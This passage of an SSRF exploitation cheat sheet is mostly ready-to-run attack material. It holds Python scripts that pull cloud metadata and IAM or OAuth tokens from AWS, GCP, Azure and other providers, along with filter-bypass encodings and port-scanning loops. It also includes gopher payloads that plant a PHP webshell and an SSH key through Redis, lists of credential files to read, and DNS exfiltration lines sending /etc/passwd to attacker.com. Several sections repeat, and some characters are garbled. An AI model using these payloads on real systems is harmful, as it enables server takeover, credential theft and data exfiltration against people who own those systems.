            token_data = self.fetch_metadata(endpoint, api_version="2018-02-01")
            
            if token_data and 'access_token' in token_data:
                tokens[name] = token_data
                print(f"[+] Token obtained for {name}")
                print(f"    Token: {token_data['access_token'][:50]}...")
                print(f"    Expires in: {token_data.get('expires_in')} seconds")
            else:
                print(f"[-] No token available for {name}")
        
        return tokens
    
    def full_exploitation(self):
        """Complete Azure metadata exploitation"""
        instance_data = self.get_instance_metadata()
        tokens = self.get_access_tokens()
        
        return {
            "instance": instance_data,
            "tokens": tokens
        }

# Usage
azure_exfil = AzureMetadataExfiltrator("http://target.com/fetch", "url")
results = azure_exfil.full_exploitation()

# Use tokens with Azure CLI
if results['tokens']:
    for resource, token_data in results['tokens'].items():
        print(f"\n[*] Use {resource} token:")
        print(f"az account get-access-token --resource {token_data.get('resource')}")
```

**Azure header bypass:**

```bash
# CRLF injection for header
http://169.254.169.254/metadata/instance?api-version=2021-02-01%0d%0aMetadata:%20true%0d%0a

# Try without header (some endpoints may work)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### DigitalOcean Metadata

```bash
# Metadata (no authentication required)
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/v1/"

# Droplet ID
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/v1/id"

# User data
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/v1/user-data"

# Public keys
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/v1/public-keys"

# All metadata as JSON
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/v1.json"
```

### Oracle Cloud Infrastructure (OCI)

```bash
# Instance metadata (version 2)
curl "http://target.com/fetch?url=http://169.254.169.254/opc/v2/instance/"

# Instance identity document
curl "http://target.com/fetch?url=http://169.254.169.254/opc/v2/instance/metadata/"

# Version 1 (legacy)
curl "http://target.com/fetch?url=http://169.254.169.254/opc/v1/instance/"
```

### Alibaba Cloud

```bash
# Instance metadata
curl "http://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"

# Instance ID
curl "http://target.com/fetch?url=http://100.100.100.200/latest/meta-data/instance-id"

# RAM role credentials
curl "http://target.com/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/[ROLE-NAME]"

# User data
curl "http://target.com/fetch?url=http://100.100.100.200/latest/user-data"
```

### Comprehensive Cloud Metadata Scanner

```python
import requests
import json

class CloudMetadataScanner:
    def __init__(self, ssrf_url, ssrf_param):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.results = {}
    
    def test_endpoint(self, url, headers=None):
        """Test cloud metadata endpoint"""
        params = {self.ssrf_param: url}
        
        try:
            response = requests.get(
                self.ssrf_url,
                params=params,
                headers=headers or {},
                timeout=5
            )
            
            if response.status_code == 200 and len(response.text) > 0:
                return response.text
        except:
            pass
        
        return None
    
    def scan_aws(self):
        """Scan AWS metadata"""
        print("\n[*] Testing AWS metadata...")
        
        endpoints = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
        ]
        
        for endpoint in endpoints:
            data = self.test_endpoint(endpoint)
            if data:
                print(f"[+] AWS: {endpoint}")
                print(f"    {data[:100]}")
                self.results['aws'] = self.results.get('aws', {})
                self.results['aws'][endpoint] = data
    
    def scan_gcp(self):
        """Scan GCP metadata"""
        print("\n[*] Testing GCP metadata...")
        
        endpoints = [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata/computeMetadata/v1/",
        ]
        
        headers = {"Metadata-Flavor": "Google"}
        
        for endpoint in endpoints:
            data = self.test_endpoint(endpoint, headers)
            if data:
                print(f"[+] GCP: {endpoint}")
                print(f"    {data[:100]}")
                self.results['gcp'] = self.results.get('gcp', {})
                self.results['gcp'][endpoint] = data
    
    def scan_azure(self):
        """Scan Azure metadata"""
        print("\n[*] Testing Azure metadata...")
        
        endpoints = [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ]
        
        headers = {"Metadata": "true"}
        
        for endpoint in endpoints:
            data = self.test_endpoint(endpoint, headers)
            if data:
                print(f"[+] Azure: {endpoint}")
                print(f"    {data[:100]}")
                self.results['azure'] = self.results.get('azure', {})
                self.results['azure'][endpoint] = data
    
    def scan_digitalocean(self):
        """Scan DigitalOcean metadata"""
        print("\n[*] Testing DigitalOcean metadata...")
        
        endpoints = [
            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.169.254/metadata/v1/user-data",
        ]
        
        for endpoint in endpoints:
            data = self.test_endpoint(endpoint)
            if data:
                print(f"[+] DigitalOcean: {endpoint}")
                print(f"    {data[:100]}")
                self.results['digitalocean'] = self.results.get('digitalocean', {})
                self.results['digitalocean'][endpoint] = data
    
    def scan_all(self):
        """Scan all cloud providers"""
        print("[*] Starting comprehensive cloud metadata scan...")
        
        self.scan_aws()
        self.scan_gcp()
        self.scan_azure()
        self.scan_digitalocean()
        
        print("\n[*] Scan complete!")
        print(f"[*] Found metadata for: {list(self.results.keys())}")
        
        return self.results

# Usage
scanner = CloudMetadataScanner("http://target.com/fetch", "url")
results = scanner.scan_all()

# Save results
with open('cloud_metadata.json', 'w') as f:
    json.dump(results, f, indent=2)
```

---

**Critical Related Topics:**

- **SSRF to RCE chains** (Redis, Memcached, internal APIs)
- **DNS Rebinding attacks** for bypassing SSRF protections
- **SSRF in PDF generators** (TCPDF, wkhtmltopdf exploitation)
- **SSRF via SVG/XML file uploads** (XXE to SSRF chaining)
- **Container escape via SSRF** (Docker socket, Kubernetes API exploitation)

---

## Attack Surface Identification

### Common Vulnerable Parameters

- URL/URI parameters: `?url=`, `?uri=`, `?path=`, `?dest=`, `?redirect=`
- File upload features accepting URLs
- PDF generators and document converters
- Webhook implementations
- Image/file fetching APIs
- RSS feed readers
- Link preview generators

### Detection Methods

```bash
# Basic SSRF test with Burp Suite Collaborator
curl "http://target.com/fetch?url=http://BURP-COLLABORATOR-SUBDOMAIN"

# Using interactsh for out-of-band detection
interactsh-client
curl "http://target.com/fetch?url=http://UNIQUE-ID.interact.sh"

# Testing for time-based SSRF (internal service)
time curl "http://target.com/fetch?url=http://127.0.0.1:PORT"
```

## Localhost Bypass Techniques

### Standard Localhost Representations

```bash
# IPv4 loopback variations
http://127.0.0.1
http://127.0.0.2 through http://127.255.255.254
http://127.1
http://0.0.0.0
http://0

# IPv6 loopback
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# Localhost variations
http://localhost
http://localtest.me (resolves to 127.0.0.1)
http://vcap.me (resolves to 127.0.0.1)
http://lvh.me (resolves to 127.0.0.1)
```

### DNS-Based Bypasses

```bash
# Using custom DNS records
# Create A record: ssrf.yourdomain.com -> 127.0.0.1
curl "http://target.com/fetch?url=http://ssrf.yourdomain.com"

# Using DNS rebinding services
http://7f000001.rbndr.us (resolves to 127.0.0.1)
http://spoofed.burpcollaborator.net

# nip.io service
http://127.0.0.1.nip.io
http://169.254.169.254.nip.io
```

### Protocol Wrappers

```bash
# File protocol
file:///etc/passwd
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd

# Dict protocol (if supported)
dict://127.0.0.1:6379/INFO

# Gopher protocol (powerful for protocol smuggling)
gopher://127.0.0.1:6379/_SET%20test%20value

# TFTP protocol
tftp://127.0.0.1:69/NETASCII/file.txt

# LDAP protocol
ldap://127.0.0.1:389/dc=example,dc=com
```

## IP Address Encoding Bypass

### Decimal Encoding

```bash
# Convert 127.0.0.1 to decimal
# Formula: (127 * 256Â³) + (0 * 256Â²) + (0 * 256) + 1 = 2130706433
http://2130706433

# AWS metadata service (169.254.169.254)
# (169 * 256Â³) + (254 * 256Â²) + (169 * 256) + 254 = 2852039166
http://2852039166

# Conversion script
python3 -c "print(sum([int(octet) * (256 ** (3-i)) for i, octet in enumerate('127.0.0.1'.split('.'))]))"
```

### Octal Encoding

```bash
# Convert each octet to octal
http://0177.0.0.1        # 127.0.0.1
http://0177.00.00.01     # Leading zeros
http://0177.0000.0000.0001

# AWS metadata
http://0251.0376.0251.0376  # 169.254.169.254
```

### Hexadecimal Encoding

```bash
# Hex encoding (0x prefix)
http://0x7f.0x0.0x0.0x1   # 127.0.0.1
http://0x7f000001         # Combined hex

# AWS metadata
http://0xa9.0xfe.0xa9.0xfe  # 169.254.169.254
http://0xa9fea9fe
```

### Mixed Encoding

```bash
# Combining different encodings
http://0177.0.0.1         # Octal + decimal
http://127.0x0.0x0.1      # Decimal + hex
http://0x7f.0.0.1         # Hex + decimal
http://2130706433         # Pure decimal
```

### URL Encoding

```bash
# Single encoding
http://127.0.0.1 -> http%3A%2F%2F127.0.0.1

# Double encoding
http%253A%252F%252F127.0.0.1

# Specific character encoding
http://127.0.0.1 -> http://127.0.0.%31
http://127.0.0.1 -> http://127.%30.%30.1
```

## Bypassing SSRF Filters

### Whitelist Bypass Techniques

#### URL Parsing Confusion

```bash
# Using @ symbol (credentials section)
http://expected-domain@127.0.0.1
http://expected-domain@169.254.169.254
http://target.com@attacker.com

# Subdomain confusion
http://127.0.0.1.expected-domain.com (if you control expected-domain.com)
http://expected-domain.com.127.0.0.1.nip.io

# Fragment/anchor bypass
http://expected-domain.com#@127.0.0.1
http://expected-domain.com#.127.0.0.1
```

#### Case Manipulation

```bash
# Mixed case in protocol
Http://127.0.0.1
hTTp://127.0.0.1

# Mixed case in hostname
http://LocalHost
http://LOCALHOST
http://lOcAlHoSt
```

#### Unicode and Rare Characters

```bash
# Unicode characters
http://127.0.0.1 (using fullwidth digits)
http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ 

# Using special characters
http://127ã€‚0ã€‚0ã€‚1 (ideographic full stop)
http://127ï¼Ž0ï¼Ž0ï¼Ž1 (fullwidth full stop)

# Whitespace/control characters
http://127.0.0.1%00
http://127.0.0.1%0d%0a
http://127.0.0.1%09
```

### Blacklist Bypass Techniques

#### Open Redirect Chaining

```bash
# If site has open redirect
http://trusted-site.com/redirect?url=http://169.254.169.254

# Using bit.ly or other URL shorteners
http://bit.ly/CUSTOM_LINK -> redirects to 169.254.169.254

# PDF/Document generators may follow redirects
http://target.com/makepdf?url=http://trusted.com/redirect?to=file:///etc/passwd
```

#### CRLF Injection in URLs

```bash
# Injecting newlines to bypass filters
http://127.0.0.1%0d%0aHost:%20expected-domain.com

# HTTP request smuggling via SSRF
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a
```

#### Alternative IP Notations

```bash
# Using alternative separators
http://127ã€‚0ã€‚0ã€‚1
http://127ï¼Ž0ï¼Ž0ï¼Ž1

# IPv6 compressed formats
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:7f00:1]

# IPv4-mapped IPv6
http://[::ffff:a9fe:a9fe]  # 169.254.169.254
```

### Protocol Smuggling

#### Gopher Protocol for Internal Services

```bash
# Redis exploitation via SSRF
gopher://127.0.0.1:6379/_SET%20key%20value

# FastCGI exploitation
gopher://127.0.0.1:9000/_%01%01...  # FastCGI binary payload

# Memcached
gopher://127.0.0.1:11211/_set%20test%200%200%205%0d%0avalue

# SMTP
gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>
```

#### Using Gopherus Tool

```bash
# Install Gopherus
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x install.sh
./install.sh

# Generate payloads
gopherus --exploit mysql
gopherus --exploit postgresql
gopherus --exploit fastcgi
gopherus --exploit redis
gopherus --exploit smtp
gopherus --exploit zabbix

# Example: Redis payload
gopherus --exploit redis
# Input commands: CONFIG SET dir /var/www/html
# Output: URL-encoded gopher payload
```

## Cloud Metadata Exploitation

### AWS Metadata Service

```bash
# IMDSv1 (older instances)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# IMDSv2 (requires token - harder to exploit)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Common endpoints
/latest/meta-data/hostname
/latest/meta-data/public-ipv4
/latest/meta-data/instance-id
/latest/user-data
/latest/dynamic/instance-identity/document
```

### Google Cloud Platform

```bash
# Metadata endpoints
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Requires header (can sometimes be bypassed)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Alternative IP
http://169.254.169.254/computeMetadata/v1/
```

### Azure Metadata Service

```bash
# Azure Instance Metadata Service
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Requires header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Digital Ocean

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
```

## Advanced Exploitation Techniques

### SSRF to RCE via Internal Services

#### Redis Exploitation

```bash
# Using SSRF to write webshell
# Generate payload with Gopherus
gopherus --exploit redis

# Commands to execute:
# CONFIG SET dir /var/www/html
# CONFIG SET dbfilename shell.php
# SET test "<?php system($_GET['cmd']); ?>"
# SAVE

# URL-encoded gopher payload
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a%3c%3fphp%20system%28%24_GET%5b%27cmd%27%5d%29%3b%20%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a%0a
```

#### Memcached Exploitation

```bash
# Inject data into memcached
gopher://127.0.0.1:11211/_set%20payload%200%200%20100%0d%0a<?php system($_GET['c']); ?>%0d%0a

# Retrieve stored data if application uses memcached
```

#### FastCGI Exploitation

```bash
# Exploit PHP-FPM via SSRF
# Requires knowledge of PHP-FPM socket path
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01...

# Use tools like fcgi_exploit
```

### Internal Port Scanning

```bash
# Automated port scanning via SSRF
for port in {1..65535}; do
    curl -s "http://target.com/fetch?url=http://127.0.0.1:$port" -o /dev/null -w "%{http_code} - $port\n"
done

# Common internal ports to test
22   - SSH
3306 - MySQL
5432 - PostgreSQL
6379 - Redis
8080 - Alternative HTTP
9200 - Elasticsearch
27017 - MongoDB
```

### Blind SSRF Detection

```bash
# Using DNS exfiltration
curl "http://target.com/fetch?url=http://unique-id.burpcollaborator.net"

# Time-based detection
# If internal service exists, response may be delayed
time curl "http://target.com/fetch?url=http://127.0.0.1:PORT"

# Using interactsh
interactsh-client -v
curl "http://target.com/fetch?url=http://YOUR-ID.interact.sh"
```

## Automated Tools

### SSRFmap

```bash
# Installation
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Basic usage
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Available modules
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m redis
python3 ssrfmap.py -r request.txt -p url -m fastcgi
python3 ssrfmap.py -r request.txt -p url -m aws
```

### SSRFTest

```bash
# Installation
go install github.com/hahwul/ssrftest@latest

# Generate test payloads
ssrftest -url http://target.com -param url

# With wordlist
ssrftest -url http://target.com -param url -wordlist payloads.txt
```

### Custom Python Script for Bypass Testing

```python
#!/usr/bin/env python3
import requests
import sys

def test_ssrf_bypass(target_url, param):
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://2130706433",
        "http://0x7f000001",
        "http://0177.0.0.1",
        "http://[::1]",
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
        "http://169.254.169.254",
        "http://[::ffff:127.0.0.1]",
        "http://127.0.0.1%00.expected.com",
        "http://127.0.0.1%0d%0a",
        "http://127ã€‚0ã€‚0ã€‚1",
        "http://expected.com@127.0.0.1",
    ]
    
    for payload in payloads:
        try:
            url = f"{target_url}?{param}={payload}"
            r = requests.get(url, timeout=5)
            print(f"[+] Payload: {payload}")
            print(f"    Status: {r.status_code}, Length: {len(r.content)}")
        except Exception as e:
            print(f"[-] Error with {payload}: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_url> <parameter>")
        sys.exit(1)
    
    test_ssrf_bypass(sys.argv[1], sys.argv[2])
```

## Filter Bypass Checklist

### Testing Methodology

1. **Identify SSRF vector** - Find parameter accepting URLs
2. **Test basic payloads** - `http://127.0.0.1`, `http://localhost`
3. **Enumerate filters** - Determine what's blocked
4. **Apply encoding bypasses** - Decimal, octal, hex, URL encoding
5. **Test DNS bypasses** - Custom domains, wildcard DNS services
6. **Protocol smuggling** - `gopher://`, `file://`, `dict://`
7. **Cloud metadata** - Test for AWS/GCP/Azure metadata access
8. **Blind detection** - Use OOB channels (DNS, HTTP callbacks)
9. **Chain vulnerabilities** - Combine with open redirect, CRLF injection
10. **Privilege escalation** - Target internal services for RCE

**Important Considerations**

**[Inference]** Different programming languages and HTTP libraries parse URLs differently, which can lead to bypasses. For example, `curl` may interpret URLs differently than Python's `urllib` or Java's `URL` class.

**[Inference]** IMDSv2 on AWS requires a PUT request to obtain a token before accessing metadata, making it harder to exploit via traditional SSRF. However, some applications may proxy HTTP methods, allowing this bypass.

**[Unverified]** Not all encoding methods work universally across all URL parsing implementations. Testing multiple variations is necessary for each target.

**Related Attack Vectors**

- **Open Redirect** - Can be chained with SSRF for filter bypass
- **CRLF Injection** - Enables HTTP request smuggling via SSRF
- **XXE (XML External Entity)** - Alternative method for SSRF in XML-parsing contexts
- **DNS Rebinding** - Advanced technique for bypassing same-origin policies

---

## File Protocol Exploitation

The `file://` protocol allows reading local files from the server's filesystem when SSRF protections are inadequate.

### Basic File Protocol Syntax

```bash
file:///etc/passwd
file://localhost/etc/passwd
file:///c:/windows/system32/drivers/etc/hosts  # Windows
```

### Detection and Exploitation

**Testing for file protocol support:**

```bash
# Basic test
http://vulnerable-site.com/fetch?url=file:///etc/passwd

# URL encoding
http://vulnerable-site.com/fetch?url=file%3A%2F%2F%2Fetc%2Fpasswd

# Double URL encoding
http://vulnerable-site.com/fetch?url=file%253A%252F%252F%252Fetc%252Fpasswd
```

### Bypass Techniques

**Protocol case variation:**

```bash
FILE:///etc/passwd
FiLe:///etc/passwd
file:////etc/passwd  # Extra slashes
```

**Localhost variations:**

```bash
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
file://[::1]/etc/passwd  # IPv6
```

**Path traversal combined:**

```bash
file:///var/www/html/../../etc/passwd
file:///../../../etc/passwd
```

### Target Files for Enumeration

**Linux systems:**

```bash
file:///etc/passwd           # User enumeration
file:///etc/shadow           # Password hashes (requires root)
file:///etc/hosts            # Network configuration
file:///proc/self/environ    # Environment variables
file:///proc/self/cmdline    # Process command line
file:///proc/self/cwd/       # Current working directory
file:///proc/net/arp         # ARP table
file:///proc/net/tcp         # Active TCP connections
file:///home/user/.ssh/id_rsa     # SSH private keys
file:///var/log/apache2/access.log # Log files
file:///var/www/html/config.php    # Application configs
```

**Windows systems:**

```bash
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/windows/win.ini
file:///c:/boot.ini
file:///c:/windows/system32/config/sam
file:///c:/inetpub/wwwroot/web.config
```

### Using cURL for SSRF Testing

```bash
# Direct file access simulation
curl "http://target.com/proxy?url=file:///etc/passwd"

# With authentication bypass
curl -X POST "http://target.com/fetch" \
  -d "url=file:///etc/passwd&validate=false"

# JSON payload
curl -X POST "http://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"file:///etc/passwd"}'
```

## Gopher Protocol Exploitation

The Gopher protocol (`gopher://`) is particularly powerful for SSRF because it allows sending arbitrary bytes to TCP services, enabling interaction with internal services like Redis, Memcached, SMTP, and more.

### Gopher Protocol Basics

**Syntax:**

```
gopher://host:port/_payload
```

The underscore after the port is significant - everything after it is sent as-is to the target service.

### Exploiting Internal Services

**Redis exploitation:**

Redis often runs on port 6379 without authentication on internal networks.

```bash
# Basic Redis command injection
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# Write SSH key to authorized_keys
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a%2A3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2496%0d%0a%0a%0assh-rsa%20AAAAB3...%0a%0a%0d%0a%2A4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/root/.ssh/%0d%0a%2A4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%2415%0d%0aauthorized_keys%0d%0a%2A1%0d%0a%244%0d%0asave%0d%0a
```

**Breaking down the Redis payload:**

```python
# Python script to generate Gopher payloads
import urllib.parse

def generate_redis_payload(commands):
    """Generate Redis protocol RESP format"""
    protocol = ""
    for cmd in commands:
        protocol += f"*{len(cmd.split())}\r\n"
        for arg in cmd.split():
            protocol += f"${len(arg)}\r\n{arg}\r\n"
    
    # URL encode
    encoded = urllib.parse.quote(protocol)
    return f"gopher://127.0.0.1:6379/_{encoded}"

# Example usage
commands = [
    "flushall",
    "set mykey myvalue",
    "save"
]
payload = generate_redis_payload(commands)
print(payload)
```

**Memcached exploitation (port 11211):**

```bash
# Set value in Memcached
gopher://127.0.0.1:11211/_set%20key%200%200%205%0d%0avalue%0d%0a

# Get value
gopher://127.0.0.1:11211/_get%20key%0d%0a

# Flush all data
gopher://127.0.0.1:11211/_flush_all%0d%0a
```

**SMTP exploitation (port 25):**

```bash
# Send email via internal SMTP
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3A%3Cattacker@evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim@target.com%3E%0d%0aDATA%0d%0aSubject%3A%20Test%0d%0a%0d%0aThis%20is%20a%20test%0d%0a.%0d%0aQUIT%0d%0a
```

**MySQL exploitation (port 3306):**

[Unverified] - MySQL protocol over Gopher is complex due to authentication handshake requirements. Basic queries may work on older versions without authentication:

```bash
# Attempt basic query (success depends on MySQL version and config)
gopher://127.0.0.1:3306/_\x00\x00\x00\x0a...
```

### Gopherus Tool

Gopherus automates Gopher payload generation for various services.

**Installation:**

```bash
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x gopherus.py
```

**Usage:**

```bash
# Redis payload generation
./gopherus.py --exploit redis

# MySQL payload
./gopherus.py --exploit mysql

# FastCGI payload
./gopherus.py --exploit fastcgi

# Memcached payload
./gopherus.py --exploit memcached

# SMTP payload
./gopherus.py --exploit smtp

# Zabbix payload
./gopherus.py --exploit zabbix
```

**Example workflow:**

```bash
# Generate Redis payload to write webshell
python gopherus.py --exploit redis

# Select option: PHP Backdoor
# It generates the full gopher URL

# Use in SSRF vulnerable parameter
curl "http://target.com/fetch?url=<generated_gopher_url>"
```

### Encoding Considerations

Gopher payloads often require multiple encoding layers:

```python
import urllib.parse

# Original payload
payload = "HELO localhost\r\nMAIL FROM:<test@test.com>\r\n"

# First encoding
encoded_once = urllib.parse.quote(payload)

# Second encoding (if application decodes twice)
encoded_twice = urllib.parse.quote(encoded_once)

print(f"gopher://127.0.0.1:25/_{encoded_once}")
```

## Data Exfiltration via SSRF

### Internal Network Scanning

**Port scanning via SSRF:**

```bash
# Bash script for port enumeration
for port in {1..65535}; do
    curl -s "http://target.com/fetch?url=http://127.0.0.1:$port" | grep -q "success" && echo "Port $port open"
done

# Focused scan on common ports
for port in 22 80 443 3306 6379 8080 9200; do
    curl -s -o /dev/null -w "%{http_code}" "http://target.com/fetch?url=http://127.0.0.1:$port"
done
```

**Python script for automated scanning:**

```python
#!/usr/bin/env python3
import requests
import concurrent.futures

def check_port(port):
    target_url = f"http://vulnerable-site.com/fetch?url=http://127.0.0.1:{port}"
    try:
        response = requests.get(target_url, timeout=2)
        if response.status_code == 200:
            print(f"[+] Port {port} appears open")
            return port
    except requests.exceptions.RequestException:
        pass
    return None

# Common internal service ports
ports = [22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017]

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(check_port, ports)
    
open_ports = [p for p in results if p is not None]
print(f"\n[*] Open ports: {open_ports}")
```

### Cloud Metadata Exfiltration

**AWS metadata service (169.254.169.254):**

```bash
# Get IAM credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

# Instance metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/user-data

# IMDSv2 (requires token) - bypass if application makes multiple requests
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**Google Cloud metadata:**

```bash
# Requires Metadata-Flavor header
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Alternative IP
http://169.254.169.254/computeMetadata/v1/
```

**Azure metadata:**

```bash
# Requires Metadata: true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**Digital Ocean:**

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
```

### Blind SSRF Detection

When no response is returned, use out-of-band techniques:

**DNS exfiltration:**

```bash
# Use Burp Collaborator or similar
http://target.com/fetch?url=http://burpcollaborator.net

# DNS data exfiltration
http://target.com/fetch?url=http://$(cat /etc/passwd | base64).attacker.com
```

**HTTP listener for blind SSRF:**

```bash
# Setup listener on your server
python3 -m http.server 80

# Or use netcat
nc -lvnp 80

# Trigger SSRF to your server
http://target.com/fetch?url=http://your-vps-ip/
```

**Time-based detection:**

```python
import requests
import time

def time_based_ssrf_check(target_url, internal_host):
    # Accessible host (should respond quickly)
    start = time.time()
    requests.get(f"{target_url}?url=http://{internal_host}:80", timeout=5)
    fast_time = time.time() - start
    
    # Inaccessible port (should timeout)
    start = time.time()
    try:
        requests.get(f"{target_url}?url=http://{internal_host}:9999", timeout=5)
    except:
        pass
    slow_time = time.time() - start
    
    if slow_time > fast_time + 2:
        print(f"[+] SSRF likely exists - timing difference detected")
```

### File Exfiltration Techniques

**Reading sensitive files:**

```bash
# Application config files
file:///var/www/html/config.php
file:///var/www/html/.env
file:///var/www/html/wp-config.php

# SSH keys
file:///home/user/.ssh/id_rsa
file:///root/.ssh/id_rsa

# Cloud credentials
file:///home/user/.aws/credentials
file:///home/user/.config/gcloud/credentials.db

# Bash history
file:///home/user/.bash_history
file:///root/.bash_history

# Docker secrets
file:///run/secrets/
```

**Exfiltrating data via DNS:**

```bash
# Read file and exfil via DNS subdomain
http://target.com/fetch?url=http://$(cat /etc/passwd | head -1 | base64).attacker.com

# Using gopher to chain commands
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aGET%0d%0asecret_key
```

### Advanced Exfiltration: HTTP Response Smuggling

[Inference] - When SSRF allows control over HTTP headers, response smuggling may be possible:

```bash
# Inject CRLF to split responses
http://target.com/fetch?url=http://internal-service/%0d%0aHeader:%20value

# Attempt to smuggle multiple requests
http://target.com/fetch?url=http://internal/%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20internal
```

## Bypass Techniques

### Blacklist Bypasses

**Alternative IP representations:**

```bash
# Decimal representation
http://2130706433/  # 127.0.0.1

# Octal representation
http://0177.0.0.1/
http://017700000001/

# Hexadecimal
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/

# Mixed encoding
http://0x7f.0.0.1/

# Dot-less format
http://2130706433/
```

**Python script for IP encoding:**

```python
def ip_to_decimal(ip):
    octets = ip.split('.')
    return sum(int(octet) * (256 ** (3 - i)) for i, octet in enumerate(octets))

def ip_to_hex(ip):
    return '0x' + ''.join(f'{int(octet):02x}' for octet in ip.split('.'))

ip = "127.0.0.1"
print(f"Decimal: {ip_to_decimal(ip)}")
print(f"Hex: {ip_to_hex(ip)}")
```

**Domain-based bypasses:**

```bash
# Subdomain pointing to localhost
http://127.0.0.1.nip.io
http://localtest.me  # Resolves to 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io

# DNS rebinding
http://your-rebinding-domain.com  # Alternates between public and internal IP
```

**URL parser bypasses:**

```bash
# Using @ symbol
http://expected-domain.com@127.0.0.1/
http://expected-domain.com@127.0.0.1:80@127.0.0.1/

# Using backslash (Windows parsing)
http://127.0.0.1\@expected-domain.com

# Enclosed alphanumerics
http://â‘«â‘¦.â“ª.â“ª.â“µ
http://â“›â“žâ“’â“â“›â“—â“žâ“¢â“£

